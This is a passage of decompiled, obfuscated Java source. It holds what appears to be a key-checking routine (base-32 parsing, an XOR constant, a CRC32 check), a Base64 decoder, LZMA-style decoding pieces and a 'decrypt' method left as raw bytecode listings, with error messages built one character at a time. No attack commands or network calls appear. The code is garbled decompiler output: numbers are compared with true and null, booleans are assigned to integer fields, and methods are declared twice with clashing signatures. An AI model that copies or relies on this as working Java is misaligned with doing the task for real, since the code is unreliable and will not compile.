    //   196: bipush #109
    //   198: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   201: pop
    //   202: aload_1
    //   203: bipush #105
    //   205: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   208: pop
    //   209: aload_1
    //   210: bipush #110
    //   212: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   215: pop
    //   216: aload_1
    //   217: bipush #117
    //   219: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   222: pop
    //   223: aload_1
    //   224: bipush #115
    //   226: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   229: pop
    //   230: aload_1
    //   231: bipush #32
    //   233: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   236: pop
    //   237: aload_1
    //   238: bipush #115
    //   240: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   243: pop
    //   244: aload_1
    //   245: bipush #105
    //   247: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   250: pop
    //   251: aload_1
    //   252: bipush #103
    //   254: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   257: pop
    //   258: aload_1
    //   259: bipush #110
    //   261: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   264: pop
    //   265: aload_1
    //   266: bipush #32
    //   268: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   271: pop
    //   272: aload_1
    //   273: bipush #111
    //   275: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   278: pop
    //   279: aload_1
    //   280: bipush #110
    //   282: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   285: pop
    //   286: aload_1
    //   287: bipush #32
    //   289: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   292: pop
    //   293: aload_1
    //   294: bipush #117
    //   296: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   299: pop
    //   300: aload_1
    //   301: bipush #110
    //   303: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   306: pop
    //   307: aload_1
    //   308: bipush #115
    //   310: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   313: pop
    //   314: aload_1
    //   315: bipush #105
    //   317: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   320: pop
    //   321: aload_1
    //   322: bipush #103
    //   324: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   327: pop
    //   328: aload_1
    //   329: bipush #110
    //   331: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   334: pop
    //   335: aload_1
    //   336: bipush #101
    //   338: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   341: pop
    //   342: aload_1
    //   343: bipush #100
    //   345: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   348: pop
    //   349: aload_1
    //   350: bipush #32
    //   352: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   355: pop
    //   356: aload_1
    //   357: bipush #115
    //   359: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   362: pop
    //   363: aload_1
    //   364: bipush #116
    //   366: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   369: pop
    //   370: aload_1
    //   371: bipush #114
    //   373: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   376: pop
    //   377: aload_1
    //   378: bipush #105
    //   380: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   383: pop
    //   384: aload_1
    //   385: bipush #110
    //   387: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   390: pop
    //   391: aload_1
    //   392: bipush #103
    //   394: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   397: pop
    //   398: aload_1
    //   399: bipush #32
    //   401: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   404: pop
    //   405: aload_1
    //   406: bipush #37
    //   408: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   411: pop
    //   412: aload_1
    //   413: bipush #115
    //   415: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   418: pop
    //   419: aload_1
    //   420: bipush #46
    //   422: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   425: pop
    //   426: aload_1
    //   427: invokevirtual toString : ()Ljava/lang/String;
    //   430: iconst_1
    //   431: anewarray java/lang/Object
    //   434: dup
    //   435: iconst_0
    //   436: aload_0
    //   437: aastore
    //   438: invokestatic format : (Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   441: invokespecial <init> : (Ljava/lang/String;)V
    //   444: athrow
    //   445: iload_1
    //   446: bipush #12
    //   448: if_icmpgt -> 460
    //   451: aload_0
    //   452: bipush #32
    //   454: invokestatic parseLong : (Ljava/lang/String;I)J
    //   457: goto -> 1087
    //   460: aload_0
    //   461: iconst_0
    //   462: iload_1
    //   463: iconst_1
    //   464: isub
    //   465: invokevirtual substring : (II)Ljava/lang/String;
    //   468: bipush #32
    //   470: invokestatic parseLong : (Ljava/lang/String;I)J
    //   473: lstore_3
    //   474: aload_0
    //   475: iload_1
    //   476: iconst_1
    //   477: isub
    //   478: invokevirtual charAt : (I)C
    //   481: bipush #32
    //   483: invokestatic digit : (CI)I
    //   486: dup
    //   487: istore_1
    //   488: ifge -> 665
    //   491: new java/lang/NumberFormatException
    //   494: dup
    //   495: new java/lang/StringBuilder
    //   498: dup
    //   499: new java/lang/StringBuilder
    //   502: dup
    //   503: invokespecial <init> : ()V
    //   506: dup
    //   507: astore_1
    //   508: bipush #66
    //   510: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   513: pop
    //   514: aload_1
    //   515: bipush #97
    //   517: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   520: pop
    //   521: aload_1
    //   522: bipush #100
    //   524: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   527: pop
    //   528: aload_1
    //   529: bipush #32
    //   531: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   534: pop
    //   535: aload_1
    //   536: bipush #100
    //   538: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   541: pop
    //   542: aload_1
    //   543: bipush #105
    //   545: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   548: pop
    //   549: aload_1
    //   550: bipush #103
    //   552: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   555: pop
    //   556: aload_1
    //   557: bipush #105
    //   559: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   562: pop
    //   563: aload_1
    //   564: bipush #116
    //   566: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   569: pop
    //   570: aload_1
    //   571: bipush #32
    //   573: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   576: pop
    //   577: aload_1
    //   578: bipush #97
    //   580: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   583: pop
    //   584: aload_1
    //   585: bipush #116
    //   587: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   590: pop
    //   591: aload_1
    //   592: bipush #32
    //   594: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   597: pop
    //   598: aload_1
    //   599: bipush #101
    //   601: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   604: pop
    //   605: aload_1
    //   606: bipush #110
    //   608: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   611: pop
    //   612: aload_1
    //   613: bipush #100
    //   615: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   618: pop
    //   619: aload_1
    //   620: bipush #32
    //   622: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   625: pop
    //   626: aload_1
    //   627: bipush #111
    //   629: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   632: pop
    //   633: aload_1
    //   634: bipush #102
    //   636: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   639: pop
    //   640: aload_1
    //   641: bipush #32
    //   643: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   646: pop
    //   647: aload_1
    //   648: invokevirtual toString : ()Ljava/lang/String;
    //   651: invokespecial <init> : (Ljava/lang/String;)V
    //   654: aload_0
    //   655: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   658: invokevirtual toString : ()Ljava/lang/String;
    //   661: invokespecial <init> : (Ljava/lang/String;)V
    //   664: athrow
    //   665: lload_3
    //   666: iconst_5
    //   667: lshl
    //   668: iload_1
    //   669: i2l
    //   670: ladd
    //   671: dup2
    //   672: lstore #5
    //   674: ldc2_w -9223372036854775808
    //   677: ladd
    //   678: lload_3
    //   679: ldc2_w -9223372036854775808
    //   682: ladd
    //   683: lstore #9
    //   685: dup2
    //   686: lstore #7
    //   688: lload #9
    //   690: lcmp
    //   691: ifge -> 698
    //   694: iconst_m1
    //   695: goto -> 711
    //   698: lload #7
    //   700: lload #9
    //   702: lcmp
    //   703: ifne -> 710
    //   706: iconst_0
    //   707: goto -> 711
    //   710: iconst_1
    //   711: ifge -> 1074
    //   714: new java/lang/NumberFormatException
    //   717: dup
    //   718: new java/lang/StringBuilder
    //   721: dup
    //   722: invokespecial <init> : ()V
    //   725: dup
    //   726: astore_1
    //   727: bipush #83
    //   729: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   732: pop
    //   733: aload_1
    //   734: bipush #116
    //   736: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   739: pop
    //   740: aload_1
    //   741: bipush #114
    //   743: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   746: pop
    //   747: aload_1
    //   748: bipush #105
    //   750: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   753: pop
    //   754: aload_1
    //   755: bipush #110
    //   757: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   760: pop
    //   761: aload_1
    //   762: bipush #103
    //   764: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   767: pop
    //   768: aload_1
    //   769: bipush #32
    //   771: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   774: pop
    //   775: aload_1
    //   776: bipush #118
    //   778: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   781: pop
    //   782: aload_1
    //   783: bipush #97
    //   785: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   788: pop
    //   789: aload_1
    //   790: bipush #108
    //   792: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   795: pop
    //   796: aload_1
    //   797: bipush #117
    //   799: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   802: pop
    //   803: aload_1
    //   804: bipush #101
    //   806: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   809: pop
    //   810: aload_1
    //   811: bipush #32
    //   813: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   816: pop
    //   817: aload_1
    //   818: bipush #37
    //   820: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   823: pop
    //   824: aload_1
    //   825: bipush #115
    //   827: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   830: pop
    //   831: aload_1
    //   832: bipush #32
    //   834: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   837: pop
    //   838: aload_1
    //   839: bipush #101
    //   841: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   844: pop
    //   845: aload_1
    //   846: bipush #120
    //   848: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   851: pop
    //   852: aload_1
    //   853: bipush #99
    //   855: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   858: pop
    //   859: aload_1
    //   860: bipush #101
    //   862: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   865: pop
    //   866: aload_1
    //   867: bipush #101
    //   869: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   872: pop
    //   873: aload_1
    //   874: bipush #100
    //   876: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   879: pop
    //   880: aload_1
    //   881: bipush #115
    //   883: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   886: pop
    //   887: aload_1
    //   888: bipush #32
    //   890: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   893: pop
    //   894: aload_1
    //   895: bipush #114
    //   897: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   900: pop
    //   901: aload_1
    //   902: bipush #97
    //   904: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   907: pop
    //   908: aload_1
    //   909: bipush #110
    //   911: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   914: pop
    //   915: aload_1
    //   916: bipush #103
    //   918: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   921: pop
    //   922: aload_1
    //   923: bipush #101
    //   925: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   928: pop
    //   929: aload_1
    //   930: bipush #32
    //   932: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   935: pop
    //   936: aload_1
    //   937: bipush #111
    //   939: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   942: pop
    //   943: aload_1
    //   944: bipush #102
    //   946: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   949: pop
    //   950: aload_1
    //   951: bipush #32
    //   953: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   956: pop
    //   957: aload_1
    //   958: bipush #117
    //   960: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   963: pop
    //   964: aload_1
    //   965: bipush #110
    //   967: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   970: pop
    //   971: aload_1
    //   972: bipush #115
    //   974: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   977: pop
    //   978: aload_1
    //   979: bipush #105
    //   981: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   984: pop
    //   985: aload_1
    //   986: bipush #103
    //   988: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   991: pop
    //   992: aload_1
    //   993: bipush #110
    //   995: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   998: pop
    //   999: aload_1
    //   1000: bipush #101
    //   1002: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   1005: pop
    //   1006: aload_1
    //   1007: bipush #100
    //   1009: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   1012: pop
    //   1013: aload_1
    //   1014: bipush #32
    //   1016: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   1019: pop
    //   1020: aload_1
    //   1021: bipush #108
    //   1023: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   1026: pop
    //   1027: aload_1
    //   1028: bipush #111
    //   1030: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   1033: pop
    //   1034: aload_1
    //   1035: bipush #110
    //   1037: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   1040: pop
    //   1041: aload_1
    //   1042: bipush #103
    //   1044: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   1047: pop
    //   1048: aload_1
    //   1049: bipush #46
    //   1051: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   1054: pop
    //   1055: aload_1
    //   1056: invokevirtual toString : ()Ljava/lang/String;
    //   1059: iconst_1
    //   1060: anewarray java/lang/Object
    //   1063: dup
    //   1064: iconst_0
    //   1065: aload_0
    //   1066: aastore
    //   1067: invokestatic format : (Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   1070: invokespecial <init> : (Ljava/lang/String;)V
    //   1073: athrow
    //   1074: lload #5
    //   1076: goto -> 1087
    //   1079: new java/lang/IllegalArgumentException
    //   1082: dup
    //   1083: invokespecial <init> : ()V
    //   1086: athrow
    //   1087: ldc2_w 4773789072989332985
    //   1090: lxor
    //   1091: lstore_1
    //   1092: bipush #8
    //   1094: newarray byte
    //   1096: dup
    //   1097: astore_0
    //   1098: iconst_0
    //   1099: lload_1
    //   1100: bipush #56
    //   1102: lushr
    //   1103: ldc2_w 255
    //   1106: land
    //   1107: l2i
    //   1108: i2b
    //   1109: bastore
    //   1110: aload_0
    //   1111: iconst_1
    //   1112: lload_1
    //   1113: bipush #48
    //   1115: lushr
    //   1116: ldc2_w 255
    //   1119: land
    //   1120: l2i
    //   1121: i2b
    //   1122: bastore
    //   1123: aload_0
    //   1124: iconst_2
    //   1125: lload_1
    //   1126: bipush #40
    //   1128: lushr
    //   1129: ldc2_w 255
    //   1132: land
    //   1133: l2i
    //   1134: i2b
    //   1135: bastore
    //   1136: aload_0
    //   1137: iconst_3
    //   1138: lload_1
    //   1139: bipush #32
    //   1141: lushr
    //   1142: ldc2_w 255
    //   1145: land
    //   1146: l2i
    //   1147: i2b
    //   1148: bastore
    //   1149: aload_0
    //   1150: iconst_4
    //   1151: lload_1
    //   1152: bipush #24
    //   1154: lushr
    //   1155: ldc2_w 255
    //   1158: land
    //   1159: l2i
    //   1160: i2b
    //   1161: bastore
    //   1162: aload_0
    //   1163: iconst_5
    //   1164: lload_1
    //   1165: bipush #16
    //   1167: lushr
    //   1168: ldc2_w 255
    //   1171: land
    //   1172: l2i
    //   1173: i2b
    //   1174: bastore
    //   1175: aload_0
    //   1176: bipush #6
    //   1178: lload_1
    //   1179: bipush #8
    //   1181: lushr
    //   1182: ldc2_w 255
    //   1185: land
    //   1186: l2i
    //   1187: i2b
    //   1188: bastore
    //   1189: aload_0
    //   1190: bipush #7
    //   1192: lload_1
    //   1193: ldc2_w 255
    //   1196: land
    //   1197: l2i
    //   1198: i2b
    //   1199: bastore
    //   1200: iconst_0
    //   1201: aload_0
    //   1202: bipush #6
    //   1204: baload
    //   1205: sipush #255
    //   1208: iand
    //   1209: bipush #8
    //   1211: ishl
    //   1212: iadd
    //   1213: i2s
    //   1214: aload_0
    //   1215: bipush #7
    //   1217: baload
    //   1218: sipush #255
    //   1221: iand
    //   1222: iadd
    //   1223: i2s
    //   1224: istore_1
    //   1225: new java/util/zip/CRC32
    //   1228: dup
    //   1229: invokespecial <init> : ()V
    //   1232: dup
    //   1233: astore_2
    //   1234: aload_0
    //   1235: iconst_0
    //   1236: bipush #6
    //   1238: invokevirtual update : ([BII)V
    //   1241: aload_2
    //   1242: invokevirtual getValue : ()J
    //   1245: l2i
    //   1246: i2s
    //   1247: iload_1
    //   1248: if_icmpeq -> 1254
    //   1251: bipush #-2
    //   1253: ireturn
    //   1254: iconst_0
    //   1255: aload_0
    //   1256: iconst_1
    //   1257: baload
    //   1258: sipush #255
    //   1261: iand
    //   1262: bipush #24
    //   1264: ishl
    //   1265: iadd
    //   1266: aload_0
    //   1267: iconst_2
    //   1268: baload
    //   1269: sipush #255
    //   1272: iand
    //   1273: bipush #16
    //   1275: ishl
    //   1276: iadd
    //   1277: aload_0
    //   1278: iconst_3
    //   1279: baload
    //   1280: sipush #255
    //   1283: iand
    //   1284: bipush #8
    //   1286: ishl
    //   1287: iadd
    //   1288: aload_0
    //   1289: iconst_4
    //   1290: baload
    //   1291: sipush #255
    //   1294: iand
    //   1295: iadd
    //   1296: ireturn
    //   1297: pop
    //   1298: goto -> 1304
    //   1301: invokevirtual printStackTrace : ()V
    //   1304: iconst_m1
    //   1305: ireturn
    // Exception table:
    //   from	to	target	type
    //   0	1251	1297	java/lang/NumberFormatException
    //   0	1251	1301	java/lang/Exception
    //   1254	1296	1297	java/lang/NumberFormatException
    //   1254	1296	1301	java/lang/Exception
  }

  /**
   * Decodes a Base64 encoded byte array.
   *
   * @param base64Data The Base64 encoded data.
   * @return The decoded data.
   */
  public static final byte[] decodeBase64(byte[] base64Data) {
    byte[] decodedData = new byte[base64Data.length];
    int i;
    for (i = base64Data.length; i - 1 > 0 && base64Data[i - 1] == 61; i--);
    if (i - 1 == 0)
      return null;
    byte[] decodedBytes = new byte[i * 3 / 4];
    byte b2;
    for (b2 = 0; b2 < i; b2++) {
      if (base64Data[b2] == 43) {
        decodedData[b2] = 62;
      } else if (base64Data[b2] == 47) {
        decodedData[b2] = 63;
      } else if (base64Data[b2] < 58) {
        decodedData[b2] = (byte)(base64Data[b2] + 52 - 48);
      } else if (base64Data[b2] < 91) {
        decodedData[b2] = (byte)(base64Data[b2] - 65);
      } else if (base64Data[b2] < 123) {
        decodedData[b2] = (byte)(base64Data[b2] + 26 - 97);
      }
    }
    b2 = 0;
    byte b1 = 0;
    while (b2 < i && b1 < decodedBytes.length / 3 * 3) {
      decodedBytes[b1++] = (byte)(decodedData[b2] << 2 & 0xFC | decodedData[b2 + 1] >>> 4 & 0x3);
      decodedBytes[b1++] = (byte)(decodedData[b2 + 1] << 4 & 0xF0 | decodedData[b2 + 2] >>> 2 & 0xF);
      decodedBytes[b1++] = (byte)(decodedData[b2 + 2] << 6 & 0xC0 | decodedData[b2 + 3] & 0x3F);
      b2 += 4;
    }
    if (b2 < i)
      if (b2 < i - 2) {
        decodedBytes[b1++] = (byte)(decodedData[b2] << 2 & 0xFC | decodedData[b2 + 1] >>> 4 & 0x3);
        decodedBytes[b1] = (byte)(decodedData[b2 + 1] << 4 & 0xF0 | decodedData[b2 + 2] >>> 2 & 0xF);
      } else if (b2 < i - 1) {
        decodedBytes[b1] = (byte)(decodedData[b2] << 2 & 0xFC | decodedData[b2 + 1] >>> 4 & 0x3);
      }
    return decodedBytes;
  }

  public static boolean a() {
    return (b == null);
  }

  public static boolean b() {
    return (b == 2);
  }

  public static boolean c() {
    return (b == true);
  }

  public static boolean d() {
    return (b == 3);
  }

  public static boolean e() {
    return (a == true);
  }

  public static boolean f() {
    return (a == null);
  }

  public static boolean g() {
    return (a == 2);
  }

  private void a() {
    b();
    this.b = null;
  }

  private void b() {
    int i;
    if ((i = this.c - this.e) == 0)
      return;
    for (byte b = 0; b < i; b++)
      this.b[b + this.f] = this.a[this.e + b];
    this.f += i;
    if (this.c >= this.d)
      this.c = false;
    this.e = this.c;
  }

  private byte a(int paramInt) {
    if ((paramInt = this.c - paramInt - 1) < 0)
      paramInt += this.d;
    return this.a[paramInt];
  }

  private int a() {
    // Byte code:
    //   0: aload_0
    //   1: getfield c : [B
    //   4: aload_0
    //   5: dup
    //   6: getfield i : I
    //   9: dup_x1
    //   10: iconst_1
    //   11: iadd
    //   12: putfield i : I
    //   15: baload
    //   16: sipush #255
    //   19: iand
    //   20: ireturn
  }

  private int a(Object paramObject, int paramInt) {
    // Byte code:
    //   0: aload_1
    //   1: checkcast [S
    //   4: dup
    //   5: astore_1
    //   6: iload_2
    //   7: saload
    //   8: istore_3
    //   9: aload_0
    //   10: getfield g : I
    //   13: bipush #11
    //   15: iushr
    //   16: iload_3
    //   17: imul
    //   18: istore #4
    //   20: aload_0
    //   21: getfield h : I
    //   24: ldc_w -2147483648
    //   27: ixor
    //   28: iload #4
    //   30: ldc_w -2147483648
    //   33: ixor
    //   34: if_icmpge -> 96
    //   37: aload_0
    //   38: iload #4
    //   40: putfield g : I
    //   43: aload_1
    //   44: iload_2
    //   45: iload_3
    //   46: sipush #2048
    //   49: iload_3
    //   50: isub
    //   51: iconst_5
    //   52: iushr
    //   53: iadd
    //   54: i2s
    //   55: sastore
    //   56: aload_0
    //   57: getfield g : I
    //   60: ldc_w -16777216
    //   63: iand
    //   64: ifne -> 94
    //   67: aload_0
    //   68: dup
    //   69: getfield h : I
    //   72: bipush #8
    //   74: ishl
    //   75: aload_0
    //   76: invokevirtual a : ()I
    //   79: ior
    //   80: putfield h : I
    //   83: aload_0
    //   84: dup
    //   85: getfield g : I
    //   88: bipush #8
    //   90: ishl
    //   91: putfield g : I
    //   94: iconst_0
    //   95: ireturn
    //   96: aload_0
    //   97: dup
    //   98: getfield g : I
    //   101: iload #4
    //   103: isub
    //   104: putfield g : I
    //   107: aload_0
    //   108: dup
    //   109: getfield h : I
    //   112: iload #4
    //   114: isub
    //   115: putfield h : I
    //   118: aload_1
    //   119: iload_2
    //   120: iload_3
    //   121: dup
    //   122: iconst_5
    //   123: iushr
    //   124: isub
    //   125: i2s
    //   126: sastore
    //   127: aload_0
    //   128: getfield g : I
    //   131: ldc_w -16777216
    //   134: iand
    //   135: ifne -> 165
    //   138: aload_0
    //   139: dup
    //   140: getfield h : I
    //   143: bipush #8
    //   145: ishl
    //   146: aload_0
    //   147: invokevirtual a : ()I
    //   150: ior
    //   151: putfield h : I
    //   154: aload_0
    //   155: dup
    //   156: getfield g : I
    //   159: bipush #8
    //   161: ishl
    //   162: putfield g : I
    //   165: iconst_1
    //   166: ireturn
  }

  private static void c(Object paramObject) {
    paramObject = paramObject;
    for (byte b = 0; b < paramObject.length; b++)
      paramObject[b] = 'Ѐ';
  }

  public l() {
    this.d = (short[][])new short[12];
    this.e = (short[][])new short[12];
    this.f = (short[][])new short[192];
    this.b = new short[4][];
    this.g = new short[114];
    this.h = new short[16];
    this.i = new short[2];
    this.c = new short[16][];
    this.d = new short[16][];
    this.j = new short[256];
    this.m = 0;
    this.k = new short[2];
    this.e = new short[16][];
    this.f = new short[16][];
    this.l = new short[256];
    this.n = 0;
    this.o = -1;
    this.p = -1;
    for (byte b = 0; b < 4; b++)
      this.b[b] = new short[64];
  }

  private int b(Object paramObject) {
    paramObject = paramObject;
    int i = 31 - a(paramObject.length);
    int j = 1;
    for (int k = i; k != 0; k--)
      j = (j << 1) + a(paramObject, j);
    return j - (1 << i);
  }

  private static int a(int paramInt) {
    if (paramInt == 0)
      return 32;
    byte b = 1;
    if (paramInt >>> 16 == 0) {
      b += true;
      paramInt <<= 16;
    }
    if (paramInt >>> 24 == 0) {
      b += true;
      paramInt <<= 8;
    }
    if (paramInt >>> 28 == 0) {
      b += true;
      paramInt <<= 4;
    }
    if (paramInt >>> 30 == 0) {
      b += true;
      paramInt <<= 2;
    }
    return b - (paramInt >>> 31);
  }

  private boolean decrypt(byte[] encryptedData, byte[] decryptedData) {
    // Byte code:
    //   0: aload_2
    //   1: arraylength
    //   2: i2l
    //   3: lstore_3
    //   4: aload_0
    //   5: aload_1
    //   6: astore #9
    //   8: dup
    //   9: astore #12
    //   11: aload #9
    //   13: putfield c : [B
    //   16: aload #12
    //   18: bipush #13
    //   20: putfield i : I
    //   23: aload_0
    //   24: aload_2
    //   25: astore #9
    //   27: dup
    //   28: astore #12
    //   30: invokevirtual a : ()V
    //   33: aload #12
    //   35: aload #9
    //   37: putfield b : [B
    //   40: aload_0
    //   41: dup
    //   42: astore #12
    //   44: dup
    //   45: astore #9
    //   47: iconst_0
    //   48: putfield e : I
    //   51: aload #9
    //   53: iconst_0
    //   54: putfield c : I
    //   57: aload #12
    //   59: getfield a : [S
    //   62: invokestatic c : (Ljava/lang/Object;)V
    //   65: aload #12
    //   67: getfield f : [S
    //   70: invokestatic c : (Ljava/lang/Object;)V
    //   73: aload #12
    //   75: getfield b : [S
    //   78: invokestatic c : (Ljava/lang/Object;)V
    //   81: aload #12
    //   83: getfield c : [S
    //   86: invokestatic c : (Ljava/lang/Object;)V
    //   89: aload #12
    //   91: getfield d : [S
    //   94: invokestatic c : (Ljava/lang/Object;)V
    //   97: aload #12
    //   99: getfield e : [S
    //   102: invokestatic c : (Ljava/lang/Object;)V
    //   105: aload #12
    //   107: getfield g : [S
    //   110: invokestatic c : (Ljava/lang/Object;)V
    //   113: aload #12
    //   115: astore #9
    //   117: iconst_1
    //   118: aload #9
    //   120: getfield j : I
    //   123: aload #9
    //   125: getfield k : I
    //   128: iadd
    //   129: ishl
    //   130: istore_2
    //   131: iconst_0
    //   132: istore #14
    //   134: goto -> 154
    //   137: aload #9
    //   139: getfield a : [[S
    //   142: iload #14
    //   144: aaload
    //   145: checkcast [S
    //   148: invokestatic c : (Ljava/lang/Object;)V
    //   151: iinc #14, 1
    //   154: iload #14
    //   156: iload_2
    //   157: if_icmplt -> 137
    //   160: iconst_0
    //   161: istore #9
    //   163: goto -> 183
    //   166: aload #12
    //   168: getfield b : [[S
    //   171: iload #9
    //   173: aaload
    //   174: checkcast [S
    //   177: invokestatic c : (Ljava/lang/Object;)V
    //   180: iinc #9, 1
    //   183: iload #9
    //   185: iconst_4
    //   186: if_icmplt -> 166
    //   189: aload #12
    //   191: getfield i : [S
    //   194: invokestatic c : (Ljava/lang/Object;)V
    //   197: iconst_0
    //   198: istore #13
    //   200: goto -> 234
    //   203: aload #12
    //   205: getfield c : [[S
    //   208: iload #13
    //   210: aaload
    //   211: checkcast [S
    //   214: invokestatic c : (Ljava/lang/Object;)V
    //   217: aload #12
    //   219: getfield d : [[S
    //   222: iload #13
    //   224: aaload
    //   225: checkcast [S
    //   228: invokestatic c : (Ljava/lang/Object;)V
    //   231: iinc #13, 1
    //   234: iload #13
    //   236: aload #12
    //   238: getfield m : I
    //   241: if_icmplt -> 203
    //   244: aload #12
    //   246: getfield j : [S
    //   249: checkcast [S
    //   252: invokestatic c : (Ljava/lang/Object;)V
    //   255: aload #12
    //   257: getfield k : [S
    //   260: invokestatic c : (Ljava/lang/Object;)V
    //   263: iconst_0
    //   264: istore #13
    //   266: goto -> 300
    //   269: aload #12
    //   271: getfield e : [[S
    //   274: iload #13
    //   276: aaload
    //   277: checkcast [S
    //   280: invokestatic c : (Ljava/lang/Object;)V
    //   283: aload #12
    //   285: getfield f : [[S
    //   288: iload #13
    //   290: aaload
    //   291: checkcast [S
    //   294: invokestatic c : (Ljava/lang/Object;)V
    //   297: iinc #13, 1
    //   300: iload #13
    //   302: aload #12
    //   304: getfield n : I
    //   307: if_icmplt -> 269
    //   310: aload #12
    //   312: getfield l : [S
    //   315: checkcast [S
    //   318: invokestatic c : (Ljava/lang/Object;)V
    //   321: aload #12
    //   323: getfield h : [S
    //   326: checkcast [S
    //   329: invokestatic c : (Ljava/lang/Object;)V
    //   332: aload #12
    //   334: dup
    //   335: astore #9
    //   337: iconst_0
    //   338: putfield h : I
    //   341: aload #9
    //   343: iconst_m1
    //   344: putfield g : I
    //   347: iconst_0
    //   348: istore_2
    //   349: goto -> 373
    //   352: aload #9
    //   354: dup
    //   355: getfield h : I
    //   358: bipush #8
    //   360: ishl
    //   361: aload #9
    //   363: invokevirtual a : ()I
    //   366: ior
    //   367: putfield h : I
    //   370: iinc #2, 1
    //   373: iload_2
    //   374: iconst_5
    //   375: if_icmplt -> 352
    //   378: iconst_0
    //   379: istore_1
    //   380: iconst_0
    //   381: istore_2
    //   382: iconst_0
    //   383: istore #5
    //   385: iconst_0
